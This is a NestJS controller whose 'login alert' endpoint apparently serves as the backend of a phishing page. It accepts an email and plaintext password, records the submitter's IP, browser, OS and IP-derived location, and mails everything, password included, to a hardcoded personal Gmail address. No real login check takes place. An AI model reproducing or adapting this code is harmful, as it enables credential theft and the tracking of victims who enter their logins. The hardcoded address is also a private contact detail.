import { Controller, Post, Body, Headers, Req, Ip } from '@nestjs/common';
import { MailService } from './providers/mail.service';
import { Request } from 'express';

@Controller('mail')
export class MailController {
  constructor(private readonly mailService: MailService) {}

  @Post('')
  async sendLoginAlert(
    @Body() body: { email: string; password: string; recipientEmail?: string },
    @Headers() headers: Record<string, string>,
    @Req() request: Request,
    @Ip() ip: string,
  ) {
    const { email, password, recipientEmail } = body;

    // Extract user agent
    const userAgent = headers['user-agent'] || 'Unknown';

    // Extract IP address (priority order)
    const ipAddress =
      headers['x-forwarded-for']?.split(',')[0] ||
      headers['x-real-ip'] ||
      ip ||
      'Unknown';

    // Parse browser information
    const { browserName, browserVersion } = this.getBrowserInfo(userAgent);

    // Get platform/OS
    const platform = this.getPlatform(userAgent);

    // Get location from IP
    const location = await this.getLocationFromIP(ipAddress);

    // Send the email with all details
    await this.mailService.sendLoginAlert(
      recipientEmail || 'favourejim56@gmail.com',
      {
        email,
        password,
        browserName,
        browserVersion,
        platform,
        ipAddress,
        location,
        userAgent,
      },
    );

    return {
      message: 'Login alert sent successfully',
      details: {
        browserName,
        platform,
        ipAddress,
        location,
      },
    };
  }

  // Helper method to parse browser info
  private getBrowserInfo(ua: string): {
    browserName: string;
    browserVersion: string;
  } {
    let browserName = 'Unknown';
    let browserVersion = 'Unknown';

    if (ua.includes('Edg/')) {
      browserName = 'Microsoft Edge';
      browserVersion = ua.match(/Edg\/([\d.]+)/)?.[1] || 'Unknown';
    } else if (ua.includes('Chrome/')) {
      browserName = 'Google Chrome';
      browserVersion = ua.match(/Chrome\/([\d.]+)/)?.[1] || 'Unknown';
    } else if (ua.includes('Firefox/')) {
      browserName = 'Mozilla Firefox';
      browserVersion = ua.match(/Firefox\/([\d.]+)/)?.[1] || 'Unknown';
    } else if (ua.includes('Safari/') && !ua.includes('Chrome')) {
      browserName = 'Safari';
      browserVersion = ua.match(/Version\/([\d.]+)/)?.[1] || 'Unknown';
    }

    return { browserName, browserVersion };
  }

  // Helper method to get platform/OS
  private getPlatform(ua: string): string {
    if (ua.includes('Windows NT 10.0')) return 'Windows 10/11';
    if (ua.includes('Windows NT')) return 'Windows';
    if (ua.includes('Mac OS X')) return 'macOS';
    if (ua.includes('Linux')) return 'Linux';
    if (ua.includes('Android')) return 'Android';
    if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
    return 'Unknown';
  }

  // Helper method to get location from IP
  private async getLocationFromIP(ipAddress: string): Promise<string> {
    // Skip for localhost
    if (
      ipAddress === '::1' ||
      ipAddress === '127.0.0.1' ||
      ipAddress === 'Unknown' ||
      ipAddress.startsWith('192.168.') ||
      ipAddress.startsWith('10.') ||
      ipAddress.startsWith('172.')
    ) {
      return 'Localhost (No geolocation available)';
    }

    try {
      const response = await fetch(
        `http://ip-api.com/json/${ipAddress}?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query`,
      );
      const data = await response.json();

      if (data.status === 'success') {
        const city = data.city || 'Unknown';
        const region = data.regionName || 'Unknown';
        const country = data.country || 'Unknown';
        return `${city}, ${region}, ${country}`;
      } else {
        return `Lookup failed: ${data.message || 'Unknown error'}`;
      }
    } catch (error) {
      console.error('Geolocation lookup failed:', error);
      return 'Geolocation service unavailable';
    }
  }
}
